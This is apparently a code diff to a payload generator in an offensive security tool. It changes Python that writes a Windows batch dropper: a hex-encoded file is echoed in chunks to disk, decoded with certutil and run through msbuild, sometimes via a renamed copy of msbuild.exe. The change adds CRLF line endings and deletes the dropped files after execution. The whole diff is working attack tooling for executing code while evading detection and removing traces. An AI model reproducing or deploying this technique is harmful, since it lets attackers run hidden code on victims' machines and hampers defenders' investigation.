@@ -102,19 +102,19 @@ class Generator:
                 # if user is SYSTEM then use the msbuild path and perform msbuild copy
                 # otherwise work out of %temp% and don't copy the binary
                 # finally, if the decoded file already exists, just run it
-                payload = ("@ECHO OFF\n"
-                           "set p=\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\\n"
-                           "copy /Y NUL %p%\\{2} > NUL 2>&1 && set SYSTEM=1\n"
-                           "IF %SYSTEM%==1 (del %p%\\{2}) ELSE (set p=%temp%)\n"
-                           "set f0=%p%\\{0}\n"
-                           "set f1=%p%\\{1}\n"
-                           "IF EXIST %f1% (GOTO RUN)\n"
+                payload = ("@ECHO OFF\r\n"
+                           "set w=0 && set p=\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\\r\n"
+                           "copy /Y NUL %p%\\{2} > NUL 2>&1 && set w=1\r\n"
+                           "IF %w%==1 (del %p%\\{2}) ELSE (set p=%temp%)\r\n"
+                           "set f0=%p%\\{0}\r\n"
+                           "set f1=%p%\\{1}\r\n"
+                           "IF EXIST %f1% (GOTO RUN)\r\n"
                            ).format(filepath[0], filepath[1], filepath[2])
                 size = 0
 
                 data = self.load_file(path).encode("hex")
                 for index, chunk in enumerate(re.findall("." * self.chunk_size, data)):
-                        payload += "echo {0} {1} %f0%\n".format(chunk, ">" if index == 0 else ">>")
+                        payload += "echo {0} {1} %f0%\r\n".format(chunk, ">" if index == 0 else ">>")
                         size += self.chunk_size
                 if len(data) > size:
                         payload += "echo {0} >> %f0%".format(data[(len(data) - size) * -1:])
@@ -124,10 +124,12 @@ class Generator:
                 else:
                         msbuild = self.gen_str(random.randrange(5, 25)) + ".exe"
                 # decode paylod, copy msbuild, launch payload
-                payload += ("\ncertutil -decodehex %f0% %f1%\n"
-                            "IF %SYSTEM%==1 (copy %p%\\msbuild.exe %p%\\{0})\n"
-                            ":RUN\n"
-                            "IF %SYSTEM%==1 (%p%\\{0} %f1%) ELSE (\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\msbuild.exe %f1%)"
+                payload += ("\r\ncertutil -decodehex %f0% %f1%\r\n"
+                            "del %f0%\r\n"
+                            "IF %w%==1 (copy %p%\\msbuild.exe %p%\\{0})\r\n"
+                            ":RUN\r\n"
+                            "IF %w%==1 (%p%\\{0} %f1%) ELSE (\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\msbuild.exe %f1%)\r\n"
+                            "del %f1%"
                             ).format(msbuild)
                 return payload
 
